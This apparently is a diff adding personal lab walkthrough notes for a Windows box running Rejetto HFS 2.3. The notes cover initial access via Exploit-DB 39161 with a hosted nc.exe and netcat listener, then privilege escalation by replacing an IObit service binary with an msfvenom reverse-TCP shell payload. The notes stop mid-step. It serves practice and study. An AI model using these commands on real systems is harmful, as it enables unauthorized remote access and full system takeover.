@@ -6,3 +6,27 @@ Recon - NMAP
 	Found 4 exploits from searchsploit [searchsploit Rejetto 2.3]
 }}
 
+[+]
+Initial Access
+{{
+	EDB ID:39161
+	[python exploit.py <Target IP> <Port>] #before running this command finish 1 & 2
+	1.Run web server to host the nc.exe file
+	2.use netcat to lisen on the port (Dont forgot to edit the exploit with Local Ip and port)
+}}
+
+[+]
+Privilege Escalation
+{{
+	1.Run winPEAS > Found C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] >> Vulnerable Program >> Try DLL Hijacking
+	2.Run PowerUp.ps1 
+	Follow 1 or 2 
+	PowerUp.ps1 >> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+	winPEAS >> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
+	**Create payload using msfvenom**
+	[msfvenom -p windows/shell/reverse_tcp LHOST=10.10.132.66 LPORT=1234 -f exe -o ASCService.exe] >> Listen on port 1234
+	Upload File to the server >> C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe 
+	#stop the service before running the above command >> cmd:[sc stop AdvancedSystemCareService9]
+	#To upload file to the server run the below command the respective path
+	
+		
